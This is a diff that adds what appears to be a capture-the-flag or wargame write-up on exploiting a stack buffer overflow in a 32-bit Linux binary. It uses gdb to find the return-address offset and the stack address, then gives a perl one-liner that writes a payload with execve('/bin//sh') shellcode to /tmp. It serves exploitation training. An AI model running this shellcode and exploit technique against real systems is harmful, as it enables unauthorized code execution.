@@ -1,0 +1,47 @@
+dest: 0xbffff6c6
+
+With 2 20 bytes long inputs, we have a 40 bytes long union of the inputs that overwrite a return address. We will prepare a payload like this :
+
+    [part of shellcode]<──────────┐
+ ┌─┤[jump]                        │
+ │  [address of shellcode start]├─┘
+ └─>[rest of shellcode]
+
+EIP at offset 29:
+    gdb> pattern_create 40
+    'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa'
+    gdb> disas main
+    ...
+    0x080485ca <+38>:	leave
+ -> 0x080485cb <+39>:	ret
+    gdb> b *0x080485cb
+    gdb> r
+     -
+    AAA%AAsAABAA$AAnAACA
+     -
+    A-AA(AADAA;AA)AAEAAa
+    gdb> n
+    gdb> pattern_search
+    Registers contain pattern buffer:
+    EIP+0 found at offset: 29           # At this point, our introduced address will be called.
+    EBP+0 found at offset: 25
+    ECX+52 found at offset: 69
+    ...
+
+Address of shellcode: (pattern_search does not work properly)
+
+    gdb> r
+     -
+    AAAAAAAAAAAAAAAAAAAA
+     -
+    BBBBBBBBBBBBBBBBBBBB
+    gdb> x/100bx $esp                                        ┌─────────────────┤ 0xbffff6c6
+    0xbffff6b0:	0xc6	0xf6	0xff	0xbf	0xd8	0x98 │  0x04	0x08
+    0xbffff6b8:	0x01	0x00	0x00	0x00	0x5d	0x83 │  0x04	0x08
+    0xbffff6c0:	0xe4	0x13	0xfd	0xb7	0x0d	0x00 └─┤0x41	0x41
+    0xbffff6c8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+
+[shellcode: 20bytes]
+[9 bytes][address]
+
+perl -e 'print "\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "A"x4075 . "\n" . "A"x9 . "\xc6\xf6\xff\xbf" . "B"x50' > /tmp/payload_1
